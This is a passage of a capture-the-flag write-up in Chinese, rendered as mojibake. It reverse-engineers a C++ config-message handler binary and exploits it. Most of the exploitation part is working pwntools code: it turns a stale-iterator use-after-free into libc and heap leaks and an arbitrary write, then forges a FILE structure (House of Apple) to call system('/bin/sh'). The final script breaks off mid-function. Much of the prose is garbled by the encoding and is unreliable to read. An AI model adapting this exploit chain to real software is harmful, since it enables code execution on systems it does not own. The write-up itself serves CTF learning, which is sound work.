## å¯¹è±¡é€†å‘

æ•°æ®ç»“æ„+ç®—æ³•çš„æ€æƒ³, é¦–å…ˆæ˜¯æ•°æ®ç»“æ„, ä¹Ÿå°±æ˜¯è¿™é‡Œçš„å¯¹è±¡(ç±»).

```c++
class Handler {
public:
    virtual void handleMsg();
    virtual void handleCMD(char* msg);
    virtual void cmdGet(char* msg);
    virtual void cmdAdd(char* msg);
};
```

åº”è¯¥æ˜¯è¿™æ ·ï¼Œæ§åˆ¶ä½“, å‚¨å­˜å‡ ä¸ªè™šå‡½æ•°, ç¼–è¯‘åå†…å­˜ä¸ºä¸€ä¸ªå†…å­˜ç©ºé—´

```c++
void __fastcall MsgHandler::MsgHandler(MsgHandler *this)
{
  Handler::Handler(this);
  *(_QWORD *)this = &off_EBC0;
  *((_DWORD *)this + 2) = -1;
  std::vector<Config *>::vector((char *)this + 16);
  *((_QWORD *)this + 5) = std::vector<Config *>::end((char *)this + 16);
  std::vector<CfgCMD *>::vector((char *)this + 48);ã€€ //ä¸´æ—¶å‚¨å­˜cmd
  std::vector<Config *>::reserve((char *)this + 16, 1LL);ã€€//å‚¨å­˜config
  std::vector<CfgCMD *>::reserve((char *)this + 48, 1LL);ã€€//å‚¨å­˜congfigCMD
}
```

```c
struct handler
{
  __int64 vtable;
  int id;
  int padding;
  struct vector vec_obj;
  __int64 last_update_obj;
  struct vector cfgcmd_queue;
};

```

ç»§æ‰¿è‡ªæ§åˆ¶ä½“çš„ä¸»å¾ªç¯ç±», æœ‰ä¸‰ä¸ª STL, vector å¾ˆç†Ÿæ‚‰äº†, ä¸»è¦æ˜¯ map, åŸºäºçº¢é»‘æ ‘çš„å®¹å™¨

æ¯ä¸ªçº¢é»‘æ ‘èŠ‚ç‚¹è‡³å°‘åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š

- **é”® (`int`)**: 4 å­—èŠ‚ï¼ˆ32 ä½ç³»ç»Ÿï¼‰æˆ– 4 å­—èŠ‚ï¼ˆ64 ä½ç³»ç»Ÿï¼Œ`int` é€šå¸¸ä¸º 4 å­—èŠ‚ï¼‰ã€‚
- **å€¼ (`Handler*`)**: 8 å­—èŠ‚ï¼ˆ64 ä½ç³»ç»Ÿçš„æŒ‡é’ˆå¤§å°ï¼‰ã€‚
- **ä¸‰ä¸ªæŒ‡é’ˆï¼ˆå·¦å­èŠ‚ç‚¹ã€å³å­èŠ‚ç‚¹ã€çˆ¶èŠ‚ç‚¹ï¼‰**: æ¯ä¸ªæŒ‡é’ˆ 8 å­—èŠ‚ï¼ˆ64 ä½ç³»ç»Ÿï¼‰ï¼Œå…± 24 å­—èŠ‚ã€‚
- **é¢œè‰²æ ‡è®°ï¼ˆçº¢/é»‘ï¼‰**: é€šå¸¸å ç”¨ 1 å­—èŠ‚ï¼Œä½†ç”±äºå†…å­˜å¯¹é½ï¼Œå¯èƒ½å®é™…å ç”¨ 8 å­—èŠ‚ã€‚

åœ¨ 64 ä½ç³»ç»Ÿä¸­ï¼Œå•ä¸ªèŠ‚ç‚¹çš„æ€»å¤§å°çº¦ä¸ºï¼š

4 (é”®)+8 (å€¼)+24 (æŒ‡é’ˆ)+8 (å¯¹é½åçš„é¢œè‰²æ ‡è®°)= 44 å­—èŠ‚

æˆ‘ä»¬é€†å‘çš„æ—¶å€™ä¸ç”¨ä»å¼€å‘çš„æœ€é¡¶å±‚çš„é€»è¾‘è§†è§’æ¥çœ‹, è€Œæ˜¯ä»äºŒè¿›åˆ¶æœ€åº•å±‚çš„å†…å­˜è§†è§’æ¥çœ‹, æ­¤æ—¶è¦æ ¹æ®æ„é€ å‡½æ•°æ¥ç¡®å®š, å› ä¸ºå¯¹è±¡å®ä¾‹åŒ–çš„æ—¶å€™é€šè¿‡æ„é€ å‡½æ•°å‡ºæ¥çš„æ‰æ˜¯å…¶çœŸæ­£çš„å†…å­˜

è¿™é‡Œé¢„åˆ†é…äº†ä¸€ä¸ªå¯¹è±¡ç©ºé—´(8 å­—èŠ‚), é‚£ä¹ˆå­ç±»å°±æ˜¯ 8âœ–3âœ–2 ä¸ª å†…å­˜å•å…ƒ, åŠ ä¸Šçˆ¶ç±»çš„å°±æ˜¯  8âœ–3âœ–2 + 1 ä¸ªå†…å­˜å•å…ƒ, å°±æ˜¯ä¸çŸ¥é“æ­¤æ—¶ä¼šä¸ä¼šä¸º msg_queue åˆ†é…ä¸€ä¸ª handle åœ¨ç±»é‡Œé¢(å¾ˆè‡ªç„¶çš„æƒ³æ³•, å› ä¸ºå¯¹è±¡å®ä¾‹åŒ–åå°±æ˜¯é™æ€çš„äº†, ä¸ç•™ handle è¿™ä¸ªæˆå‘˜å°±æ²¡æœ‰ç©ºé—´äº†), gdb çœ‹ä¸€ä¸‹,0x25D9 è¿™é‡Œ

åˆå§‹åŒ–å‰

![](https://raw.githubusercontent.com/4ak5ra/image/main/å±å¹•æˆªå›¾ 2025-04-09 193356.png)

åˆå§‹åŒ–å(è¿™é‡Œæˆ‘å¿˜äº†åç§»æ˜¯ä» 0 å¼€å§‹ç®—çš„å°±å¤šçœ‹äº†ä¸€ä¸ªå†…å­˜å•å…ƒ)

![](https://raw.githubusercontent.com/4ak5ra/image/main/å±å¹•æˆªå›¾ 2025-04-09 193411.png)

map å äº† 6 å’Œå†…å­˜å•å…ƒï¼ˆä¸‰ä¸ªè¿­ä»£å™¨å’Œä¸€ä¸ªè®¡æ•°å™¨ï¼Œä¸Šé¢ä¸¤ä¸ªä¸çŸ¥é“å•¥ä¸œè¥¿ï¼‰, vector çš„è¯å°±æ˜¯ä¸‰ä¸ªè¿­ä»£å™¨.T *start_;    T * finish_;    T *endOfStorage_;

![](https://raw.githubusercontent.com/4ak5ra/image/main/å±å¹•æˆªå›¾ 2025-04-09 221721.png)

åœ¨ MainLoop æ³¨å†Œ handle åçš„å†…å­˜å¸ƒå±€.gdb é‡Œå¯ä»¥çœ‹åˆ°è°ƒç”¨æ³¨å†Œå‡½æ•°å mainloop å¯¹è±¡ä¸­çš„æ•°æ®æ”¹å˜äº†ä¸”è¿”å›äº†ä¸€ä¸ªå †åœ°å€, è¿”å›çš„æ—¶å€™æŠŠè¯¥å¯¹è±¡æ”¾åˆ°è¿™ä¸ªå †åœ°å€é‡Œé¢.ç¬¬äºŒæ¬¡æ³¨å†Œååªæœ‰ map å®¹å™¨æœ€åä¸€ä¸ªå†…å­˜çš„æ•°æ®åŠ äº† 1

![](https://raw.githubusercontent.com/4ak5ra/image/main/mapå†…å­˜.png)

å®ä¾‹åŒ–åå°±æ˜¯è¿™æ ·, æ ˆä¸Šåªå­˜æ”¾ç¬¬ä¸€ä¸ª map å¯¹è±¡çš„è¿­ä»£å™¨å’Œå·²æœ‰ map çš„è®¡æ•°å™¨, map å¯¹è±¡é‡Œæœ‰ next å’Œ prev æŒ‡é’ˆ, idx(offset 0), key å’Œ value

```c
struct mainloop_vtable
{
  __int64 handleMsg;
  __int64 handleCMD;
  __int64 cmdGet;
  __int64 cmdAdd;
};

struct vector
{
  __int64 begin;
  __int64 endOfStorage;
  __int64 end;
};

struct map
{
  __int64 what;
  __int64 begin;
  __int64 endOfStorage;
  __int64 end;
  __int64 map_num;
};

struct main_loop
{
  struct mainloop_vtable *vtable;
  struct map msg_queue;
  struct vector cmd_queue;
  struct vector cfgcmd_queue;
};

```

ç„¶åæ˜¯ parseTLVCfgCMD å‡½æ•°, æ ¹æ® io æç¤ºçš„å­—ç¬¦ä¸²æ¥æ¨æ–­å‡ºæœ‰ Config content length `*(_DWORD *)(v1 + 8)` å’Œ Config name length `*((_DWORD *)v7 + 6)` ä¸¤ä¸ªæˆå‘˜

CfgCMD ç»“æ„ä½“

```c
struct msg
{
  int optcode;
  int padding;
  unsigned int config_name_size;
  __int64 config_name_ptr;
  unsigned int content_size;
  __int64 content_ptr;
  char isUpdate;
};
struct CMD {
    int msg_type;
    int cmd_target;//è¿™å®é™…æ˜¯æå‰æ³¨å†Œçš„handleç±»å‹
    unsigned int cnt;
    char data[1]; // å®é™…ä¸Šæ˜¯ä¸€ä¸ªå¯å˜é•¿åº¦æ•°ç»„ï¼Œå­˜æ”¾ CfgCMD çš„æ•°æ®
};
```

parseTLVCfgCMD å‡½æ•°å°†æˆ‘ä»¬è¾“å…¥çš„æ•°æ®è§£ææˆ CfgCMD æ ¼å¼å¹¶åˆ†é…ç©ºé—´å‚¨å­˜, ç±»ä¼¼äºæ„é€ å‡½æ•°(åˆåˆ†é…ç©ºé—´åˆåˆå§‹åŒ–å¯¹è±¡)

```c
msg *__fastcall parseTLVCfgCMD(msg *msg)
{
  msg *CfgCMD; // rax
  __int64 v2; // rax
  __int64 v4; // rax
  unsigned int *name_end; // [rsp+8h] [rbp-18h]
  void *content_begin; // [rsp+8h] [rbp-18h]
  msg *tem_CfgCMD; // [rsp+18h] [rbp-8h]

  CfgCMD = (msg *)operator new(48uLL);
  CfgCMD->optcode = 0;
  CfgCMD->config_name_size = 0;
  CfgCMD->config_name_ptr = 0LL;
  CfgCMD->content_size = 0;
  CfgCMD->content_ptr = 0LL;
  CfgCMD->isUpdate = 0;
  tem_CfgCMD = CfgCMD;
  CfgCMD->optcode = msg->optcode;
  CfgCMD->config_name_size = msg->padding;
  if ( CfgCMD->config_name_size <= 0x100 )      // Config name length
  {
    CfgCMD->config_name_ptr = operator new[](CfgCMD->config_name_size + 1);
    memcpy((void *)tem_CfgCMD->config_name_ptr, &msg->config_name_size, tem_CfgCMD->config_name_size);// åªæ˜¯copyè€Œå·²
    *(_BYTE *)(tem_CfgCMD->config_name_ptr + tem_CfgCMD->config_name_size) = 0;
    name_end = (unsigned int *)((char *)&msg->config_name_size + tem_CfgCMD->config_name_size);
    tem_CfgCMD->content_size = *name_end;
    if ( tem_CfgCMD->content_size <= 0x1000 )   // Config content length
    {
      content_begin = name_end + 1;
      tem_CfgCMD->content_ptr = operator new[](tem_CfgCMD->content_size + 1);
      memcpy((void *)tem_CfgCMD->content_ptr, content_begin, tem_CfgCMD->content_size);
      *(_BYTE *)(tem_CfgCMD->content_ptr + tem_CfgCMD->content_size) = 0;
      tem_CfgCMD->isUpdate = *((_BYTE *)content_begin + tem_CfgCMD->content_size);// content end
      return tem_CfgCMD;
    }
    else
    {
      v4 = std::operator<<<std::char_traits<char>>(&std::cerr, "Config content length is too large!");
      std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
      if ( tem_CfgCMD->config_name_ptr )
        operator delete[]((void *)tem_CfgCMD->config_name_ptr);
      if ( tem_CfgCMD )
        operator delete(tem_CfgCMD);
      return 0LL;
    }
  }
  else
  {
    v2 = std::operator<<<std::char_traits<char>>(&std::cerr, "Config name length is too large!");
    std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
    if ( tem_CfgCMD )
      operator delete(tem_CfgCMD);
    return 0LL;
  }
}
```

io è„šæœ¬çš„æ¨¡æ¿, æˆ‘ä»¬å‘é€çš„åŸºæœ¬çš„ payload

```python
def new_cfg(op, name, content, updated):
    normal_cfg = b''
    normal_cfg += p32(op)
    normal_cfg += p32(len(name))
    normal_cfg += name
    # content
    normal_cfg += p32(len(content))
    normal_cfg += content
    normal_cfg += p8(updated)

    return normal_cfg

configs = new_cfg(op, name, content, updated)
   payload = b""
    payload += p32(1)
    payload += p32(0x41)
    payload += p32(len(configs))
    for each in configs:
        payload += each

```

## èœå•é€†å‘

å¤§æ¦‚æµç¨‹å°±æ˜¯å…ˆå°†ä¸€ä¸ª `struct CMDå¯¹è±¡` çš„æ•°æ®ä¼ å…¥åˆ°æ ˆä¸Šçš„ç¼“å†²åŒº, ç„¶åç”¨ `parseTLVCfgCMD` å‡½æ•°æ ¹æ®è¿™äº›æ•°æ®æ„é€  `cfgcmd_queue` å¯¹è±¡(è¿™ä¸ªè¿‡ç¨‹å¯ä»¥ç†è§£ä¸ºååºåˆ—åŒ–, æ­¤æ—¶è¯¥å¯¹è±¡åŒ…å«çš„æ˜¯å®Œæ•´çš„ CMD å¯¹è±¡çš„ä¿¡æ¯), ç„¶åè°ƒç”¨ `handleCMD` å‡½æ•°æ ¹æ® `æ¶ˆæ¯ç±»å‹(æè¿°å¯¹è±¡çš„ä¸€ç§ä¿¡æ¯)` æ¥å¤„ç†ç”¨æˆ·æŒ‡å®šçš„è¿™äº›ä¿¡æ¯, æˆ‘ä»¬ä¸»è¦åˆ©ç”¨ç¬¬ä¸€ç§æ¶ˆæ¯ç±»å‹, æ­¤æ—¶è°ƒç”¨ `handle_dispatch` æ¥è¿›è¡Œæ¶ˆæ¯ç§ç±»åŒ¹é…(cmd_target å¯¹è±¡åŒ¹é…äº‹å…ˆæ³¨å†Œå¥½çš„ handle, æ­¤æ—¶æˆ‘ä»¬ä¸»è¦åˆ©ç”¨æœ¬åœ°è¿™ç§ç±»å‹), å¤„ç† `msg_queue` å¯¹è±¡çš„ data æˆå‘˜(CfgCMD), è¿™é‡Œå°±æ˜¯èœå•æ“ä½œäº†, è¿™äº›å‘½ä»¤ä¼šæ“ä½œå¯¹åº” handle çš„ `vec_objs` å¯¹è±¡(å‚¨å­˜ Config*çš„).

è¿™é‡Œ [SamsÄra]([SamsÄraã®blog](https://samsara-lo.github.io/))å¸ˆå‚…å‘Šè¯‰æˆ‘äº†ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„ ida å°æŠ€å·§ï¼ˆğŸ‘ï¼‰ : åœ¨æ³¨é‡Šé‡Œå†™ä¸Šä¸€ä¸ªåœ°å€, åŒå‡»çš„æ—¶å€™å°±å¯ä»¥ç›´æ¥è·³è½¬è¿‡å», åƒè¿™æ ·



![](https://raw.githubusercontent.com/4ak5ra/image/main/å±å¹•æˆªå›¾ 2025-04-13 153320.png)

åœ¨å¤„ç†è¿™ç§è™šè¡¨æ»¡å¤©é£æˆ–è€…æ‰§è¡Œæµå¾ˆå¤æ‚ä½†æ˜¯æˆ‘ä»¬éœ€è¦åˆ©ç”¨çš„åˆ†æ”¯å¾ˆå°‘çš„ç¨‹åºå¾ˆæœ‰ç”¨

```c++
struct Config {
    int config_type;
    char* config_name; //heap
    char* content;  //heap
}
```

å› ä¸ºæ²¡æœ‰å»ç¬¦å·, æ‰€ä»¥å¯¹è±¡é€†å‘æ˜ç™½ä¹‹åèœå•æ“ä½œå°±å¾ˆå¥½é€†äº†, ä¸»è¦å…³æ³¨è¿™ä¸¤ä¸ª visit å’Œ update æ“ä½œ

```c
void __fastcall MsgHandler::visit_obj(handler *this)
{
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 vec_objs_end[2]; // [rsp+10h] [rbp-10h] BYREF

  vec_objs_end[1] = __readfsqword(0x28u);
  vec_objs_end[0] = std::vector<Config *>::end(&this->vec_obj);
  if ( (unsigned __int8)__gnu_cxx::operator!=<Config **,std::vector<Config *>>(&this->last_update_obj, vec_objs_end) )
  {
    v1 = __gnu_cxx::__normal_iterator<Config **,std::vector<Config *>>::operator*(&this->last_update_obj);
    printf("Current Object Name: %s \n", *(const char **)(*(_QWORD *)v1 + 8LL));
    v2 = __gnu_cxx::__normal_iterator<Config **,std::vector<Config *>>::operator*(&this->last_update_obj);
    printf("Content: %s\n", *(const char **)(*(_QWORD *)v2 + 16LL));
  }
  else
  {
    puts("No current object.");
  }
}
```

```c
void __fastcall MsgHandler::cmdUpdate(handler *this, msg *a2)
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND]

  v18 = __readfsqword(0x28u);
  v17 = a2;
  vec_objs_end = std::vector<Config *>::end(&this->vec_obj);
  if ( (unsigned __int8)__gnu_cxx::operator!=<Config **,std::vector<Config *>>(&this->last_update_obj, &vec_objs_end) )
  {
    v2 = *(void **)(*(_QWORD *)__gnu_cxx::__normal_iterator<Config **,std::vector<Config *>>::operator*(&this->last_update_obj)
                  + 8LL);
    if ( v2 )
      operator delete[](v2);
    v3 = *(void **)(*(_QWORD *)__gnu_cxx::__normal_iterator<Config **,std::vector<Config *>>::operator*(&this->last_update_obj)
                  + 16LL);
    if ( v3 )
      operator delete[](v3);
    v4 = v17->config_name_size + 1;
    v5 = *(_QWORD *)__gnu_cxx::__normal_iterator<Config **,std::vector<Config *>>::operator*(&this->last_update_obj);
    *(_QWORD *)(v5 + 8) = operator new[](v4);
    config_name_size = v17->config_name_size;
    config_name_ptr = (const void *)v17->config_name_ptr;
    v8 = __gnu_cxx::__normal_iterator<Config **,std::vector<Config *>>::operator*(&this->last_update_obj);
    memcpy(*(void **)(*(_QWORD *)v8 + 8LL), config_name_ptr, config_name_size);
    v9 = __gnu_cxx::__normal_iterator<Config **,std::vector<Config *>>::operator*(&this->last_update_obj);
    *(_BYTE *)(*(_QWORD *)(*(_QWORD *)v9 + 8LL) + v17->config_name_size) = 0;
    v10 = v17->content_size + 1;
    v11 = *(_QWORD *)__gnu_cxx::__normal_iterator<Config **,std::vector<Config *>>::operator*(&this->last_update_obj);
    *(_QWORD *)(v11 + 16) = operator new[](v10);
    content_size = v17->content_size;
    content_ptr = (const void *)v17->content_ptr;
    v14 = __gnu_cxx::__normal_iterator<Config **,std::vector<Config *>>::operator*(&this->last_update_obj);
    memcpy(*(void **)(*(_QWORD *)v14 + 16LL), content_ptr, content_size);
    v15 = __gnu_cxx::__normal_iterator<Config **,std::vector<Config *>>::operator*(&this->last_update_obj);
    *(_BYTE *)(*(_QWORD *)(*(_QWORD *)v15 + 16LL) + v17->content_size) = 0;
  }
}
```

åœ¨è¿™é‡Œ

```c++
if ( v8->isUpdate )
    {
      v4 = std::vector<Config *>::end(&this->vec_obj);
      v5 = std::vector<Config *>::begin(&this->vec_obj);
      this->last_update_obj = std::find_if<__gnu_cxx::__normal_iterator<Config **,std::vector<Config *>>,MsgHandler::handleCMD(char *)::{lambda(Config *)#1}>(
                                v5,
                                v4,
                                v8);
    }
//è¿½äº†å¾ˆå¤šæ¬¡æ‰æ‰¾åˆ°è‡ªå®šä¹‰çš„åˆ¤æ–­ä¿¡æ¯,ç¥äº†
bool __fastcall MsgHandler::handleCMD(char *)::{lambda(Config *)#1}::operator()(msg **a1, __int64 a2)
{
  return strcmp(*(const char **)(a2 + 8), (const char *)(*a1)->config_name_ptr) == 0;
}
```

last_update_obj æˆ‘ä»¬å¯ä»¥è‡ªå·±æ§åˆ¶,.è€Œä¸Šé¢çš„ visit å’Œ update éƒ½æ˜¯ç”¨çš„è¿™ä¸ªè¿­ä»£å™¨æ¥è®¿é—®çš„ vec_objs å¯¹è±¡, é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ¶é€ å‡ºæœªå®šä¹‰è¡Œä¸ºçš„-è¿­ä»£å™¨é€ å‡º UAF, é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨ UAF å®ç°æ³„éœ² libc å’Œ heap, ç„¶ååˆ©ç”¨ update å®ç°ä»»æ„å†™



## åˆ©ç”¨

### æ„é€  UAF

åªéœ€è¦è®© vector æ‰©å®¹åï¼Œè®© last_update_obj ç•™åœ¨åŸæ¥çš„å†…å­˜å¹¶ä¸­åˆ é™¤ last_update_obj æŒ‡å‘çš„é‚£ä¸ª Config å¯¹è±¡å°±è¡Œäº†

![](https://raw.githubusercontent.com/4ak5ra/image/main/å±å¹•æˆªå›¾ 2025-04-12 103248.png)
### æ³„æ¼ libc

ç„¶åå°±æ˜¯åˆ†å‰²å †å—æ¥æ³„éœ²äº†ã€‚å…ˆæ˜ç¡®æˆ‘ä»¬çš„æ“ä½œã€‚æˆ‘ä»¬å¯ä»¥ç”¨ add åˆ†é…ä¸€å®šå¤§å°çš„(å¸¸è§„æ–¹æ³•ä¸‹éƒ½å¤Ÿç”¨)heap ç”¨æ¥å‚¨å­˜ name å’Œ contentï¼Œè¿™ä¸¤ä¸ª ptr å‚¨å­˜åœ¨ Config å¯¹è±¡é‡Œï¼Œç„¶åæˆ‘ä»¬å¯ä»¥ç”¨ update æ¥ä¿®æ”¹ name å’Œ contentï¼Œç”¨ visit æ¥è®¿é—® last_update_objï¼Œè®¿é—®ç”¨æ˜¯å¦ update æ¥æ›´æ–° last_update_objï¼Œç”¨ delete åˆ é™¤ vecort çš„å¯¹è±¡å’Œ name å’Œ contentã€‚é‚£ä¹ˆæ€è·¯å°±å¾ˆç®€å•äº†ï¼Œæ·»åŠ  4 ä¸ªæ–°å¯¹è±¡ï¼Œä¸¤ä¸ª unsorted bin çš„å¯¹è±¡ï¼Œå¹¶ä¸”è®© now_obj æŒ‡å‘ç¬¬ä¸‰ä¸ªå¯¹è±¡å†åˆ é™¤ç¬¬ä¸‰ä¸ªå¯¹è±¡ï¼Œæ­¤æ—¶å› ä¸ºå‰é¢è§£ææ¶ˆæ¯æ—¶ç”³è¯·äº†ä¸€ä¸ªä¸´æ—¶å¯¹è±¡é‚£ä¹ˆåˆ é™¤ç¬¬ä¸‰ä¸ªå¯¹è±¡æ—¶å°±å­˜åœ¨ä¸€ä¸ªå¾ˆå¤§çš„ unsorted bin è®©æˆ‘ä»¬åˆ‡å‰²äº†
```python
    configs = []
    name = b'A'*0x30
    content = b'a'*0x30
    configs.append(new_cfg(1, name, content, 0))
    name = b'B'*0x30
    content = b'B'*0x30
    configs.append(new_cfg(1, name, content, 0))

    name = b'C' * 0x30 #tcahe
    content = b'C' * 0x420 #unsorted
    configs.append(new_cfg(1, name, content, 1))#æ›´æ–°last_update_objè¿­ä»£å™¨

    name = b'D' * 0x30
    content = b'D' * 0x420 
    configs.append(new_cfg(1, name, content, 0))#æ”¾åˆå¹¶ + æä¾›é¢å¤–çš„ç©ºé—´è®©æˆ‘ä»¬åˆ‡å‰²

    name = b'E' * 0x30
    content = name 
    configs.append(new_cfg(1, name, content, 0)) #vectoræ‰©å®¹ï¼Œè®©last_update_objç•™åœ¨åŸæ¥çš„å†…å­˜ä¸­

    # delete
    name = b'C'*0x30
    content = b''
    configs.append(new_cfg(3, name, content, 0))

    name = b''
    content = b'C'*0x6c0
    configs.append(new_cfg(4, name, content, 0)) #åˆ†å‰²
```
![](https://raw.githubusercontent.com/4ak5ra/image/main/å±å¹•æˆªå›¾_20250412_181914.png)   

`hex (0x581a340d87e0+0x6c0+0x20) = 0x581a340d8ec0`

![](https://raw.githubusercontent.com/4ak5ra/image/main/å±å¹•æˆªå›¾_20250412_182227.png)
### æ³„æ¼ heap 
ä¸€æ ·çš„æ€è·¯
```python
    name = b'F'*0x30
    content = b'F'*0x420
    configs.append(new_cfg(1, name, content, 1)) #å æ®ä¸Šä¸€ä¸ª0x420çš„ä½ç½®

    name = b'G'*0x30
    content = b'G'*0x30
    configs.append(new_cfg(1, name, content, 0))
    name = b'H'*0x30
    content = b'H'*0x30
    configs.append(new_cfg(1, name, content, 0))
    name = b'I'*0x30
    content = b'I'*0x30
    configs.append(new_cfg(1, name, content, 0))

    name = b'J'*0x30
    content = b''
    configs.append(new_cfg(1, name, content, 0)) #æ‰©å®¹

    name = b'F'*0x30
    content = b''
    configs.append(new_cfg(3, name, content, 0)) #delete

    # split block, leak again
    name = b''
    content = b''
    configs.append(new_cfg(4, name, content, 0))
```
å› ä¸ºä¸Šä¸€æ­¥ç”³è¯·äº†å¾ˆå¤šå¤§çš„ unsortedbinï¼Œæ‰€ä»¥åˆ†å‰²åå¾ˆè‡ªç„¶çš„å°±æœ‰ä¸åŒçš„ unsirtedbin å­˜åœ¨ï¼Œæ­¤æ—¶éƒ½ä¸éœ€è¦è®¡ç®—åˆ†å‰²çš„ä½ç½®ï¼Œfree çš„æ—¶å€™è®© ptmalloc å¸®æˆ‘ä»¬é“¾ä¸Š heap å³å¯
### æ„é€ ä»»æ„å†™
> æ‰€è°“æŠ½è±¡ï¼Œå°±æ˜¯æŠŠä¸€ä¸ªå‡½æ•°çš„åŠŸèƒ½æƒ³è±¡æˆä¸€ä¸ªæ±‡ç¼–æŒ‡ä»¤ç±»ä¼¼çš„ä¸œè¥¿ï¼Œè€Œè¯¥æŒ‡ä»¤æ“ä½œçš„å†…å­˜ä¹Ÿæ˜¯ç”±è‡ªå·±æƒ³è±¡çš„

å‰é¢çš„æ“ä½œç»“æŸåï¼Œæˆ‘ä»¬çš„å†…å­˜å¸ƒå±€æˆäº†è¿™æ ·
![](https://raw.githubusercontent.com/4ak5ra/image/main/å±å¹•æˆªå›¾_20250413_100003.png) 

last_update_obj ä¸Šæ–¹çš„å¯¹è±¡å› ä¸ºæ‰©å®¹éƒ½è¢«é‡Šæ”¾ï¼Œè¿™å°±å¯¼è‡´äº†æˆ‘ä»¬å¯ä»¥å†æ¬¡ç”³è¯·å›è¦†ç›– last_update_obj æŒ‡å‘çš„å¯¹è±¡å†é…åˆ update åŠŸèƒ½è¾¾æˆä»»æ„åœ°å€å†™
```python
    configs = []
    name = b'aaa'
    content = b'a'*32+p64(_STDIN_chain-0x8)+b'a'*23 #åœ¨è§£æçš„æ—¶å€™ç”³è¯·è¿™ä¸ª0x50çš„å †å—
    configs.append(new_cfg(1, name, content, 0))
```

ç„¶åéšä¾¿æ‰¾ä¸ªåœ°æ–¹æŠŠä¼ªé€ çš„ file çš„ payload å†™è¿›å»ï¼Œå› ä¸ºæ˜¯ä½ç‰ˆæœ¬æ‰€ä»¥ç›´æ¥ç”¨ update å¾€ stdin._chain åæ–¹æ”¾å…¥ä¼ªé€ çš„ fil çš„åœ°å€ e å®ç° house of apple çš„æ”»å‡»(æ‰“ hook æ›´å¿«)
```python
    another_heap = heap+0x12470
    fake_stdin = heap+0x12380 
    name = b'/bin/sh\x00'+p64(0) + p64(0x10)+p64(system_addr)+p64(1)+p64(0x100)+p64(0)*14+p64(another_heap)+p64(0)+p64(0)+p64(0)+p64(1)+p64(0)+p64(0)+p64(_IO_wfile_jumps+0x30) #fake_stdin

    content = p64(510)+p64(0)+p64(0)+p64(510)+p64(530)+p64(0)+p64(0)+p64(0)+p64(0)*20+p64(fake_stdin)
    configs.append(new_cfg(2, name, content, 0))
```

## wp
```python
from pwn import *
from pwncli import *
#context(os='linux', arch='mips',endian="little", log_level='debug')
context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='amd64')
context.terminal = ['tmux', 'sp', '-h']

file_name = "./main"
elf=ELF(file_name)
url = ""
port = 0
libc=0
def debug(filename = file_name,b_slice=[],is_pie=0,is_start = 1):
    global ph
    b_string = ""
    if is_pie:
        for i in b_slice:
            b_string += f"b *$rebase({i})\n"
        for i in range(1,2):
            b_string += f"c\n"
        #b_string += f"tel rbp\n"
    else:
        for i in b_slice:
            b_string += f"b *{hex(i)}\n"
        for i in range(1,2):
            b_string += f"c\n"            
    if is_start :
        ph = gdb.debug(filename,b_string)
        return
    else:
        gdb.attach(ph,b_string)
        pause()
b_examp=0x03C38 
b_show = 0x003A58 
b_add= 0x3C15
b_free = 0x3C58
b_slice = [
    b_examp
]

ph = process(file_name)
debug(b_slice = b_slice,is_pie=1,is_start=1) 
 
def new_cfg(op, name, content, updated):
    normal_cfg = b''
    normal_cfg += p32(op)
    normal_cfg += p32(len(name))
    normal_cfg += name
    # content
    normal_cfg += p32(len(content))
    normal_cfg += content
    normal_cfg += p8(updated)

    return normal_cfg

def config_leak_libc_unsorted():

    configs = []

    name = b'A'*0x30
    content = b'a'*0x30
    configs.append(new_cfg(1, name, content, 0))
  
    name = b'B'*0x30
    content = b'B'*0x30
    configs.append(new_cfg(1, name, content, 0))

    name = b'C' * 0x30 #tcahe
    content = b'C' * 0x420 #unsorted
    configs.append(new_cfg(1, name, content, 1))


    name = b'D' * 0x30
    content = b'D' * 0x420 
    configs.append(new_cfg(1, name, content, 0))

    name = b'E' * 0x30
    content = name 
    configs.append(new_cfg(1, name, content, 0))


    name = b'C'*0x30
    content = b''
    configs.append(new_cfg(3, name, content, 0))


    name = b''
    content = b'C'*0x6c0
    configs.append(new_cfg(4, name, content, 0))

    payload = b""

    payload += p32(1)
    payload += p32(0x41)
    payload += p32(len(configs))

    for each in configs:
        payload += each

    return payload

def config_leak_heap_unsorted():
    configs = []

    # update1
    name = b'F'*0x30
    content = b'F'*0x420
    configs.append(new_cfg(1, name, content, 1)) #å æ®ä¸Šä¸€ä¸ª0x420çš„ä½ç½®

    name = b'G'*0x30
    content = b'G'*0x30
    configs.append(new_cfg(1, name, content, 0))
    name = b'H'*0x30
    content = b'H'*0x30
    configs.append(new_cfg(1, name, content, 0))
    name = b'I'*0x30
    content = b'I'*0x30
    configs.append(new_cfg(1, name, content, 0))

    name = b'J'*0x30
    content = b''
    configs.append(new_cfg(1, name, content, 0)) #æ‰©å®¹

    name = b'F'*0x30
    content = b''
    configs.append(new_cfg(3, name, content, 0)) #delete

    # split block, leak again
    name = b''
    content = b''
    configs.append(new_cfg(4, name, content, 0))

    # here try to add tcache
    payload = b""
    # send to local handle
    payload += p32(1)
    payload += p32(0x41)
    payload += p32(len(configs))

    for each in configs:
        payload += each

    return payload

def config_exploit_IO(libc, heap):
    _IO_list = libc + 0x1cb5a0 - 0x10
    _STDIN_chain = libc + 0x1ec980 + 0x68
    system_addr = libc+0x52290
    
    _IO_wfile_jumps = libc+0x1e8f60
    another_heap = heap+0x12470
    fake_stdin = heap+0x12380 
    log.success("another heap address is " + hex(another_heap))
    log.success("name heap address is " + hex(name_heap))

    configs = []
    name = b'aaa'
    # prepare first heap
    content = b'a'*32+p64(_STDIN_chain-0x8)+b'a'*23
    configs.append(new_cfg(1, name, content, 0))

    # update it!

    name = b'/bin/sh\x00'+p64(0) + p64(0x10)+p64(system_addr)+p64(1)+p64(0x100)+p64(0)*14+p64(another_heap)+p64(0)+p64(0)+p64(0)+p64(1)+p64(0)+p64(0)+p64(_IO_wfile_jumps+0x30) #fake_stdin

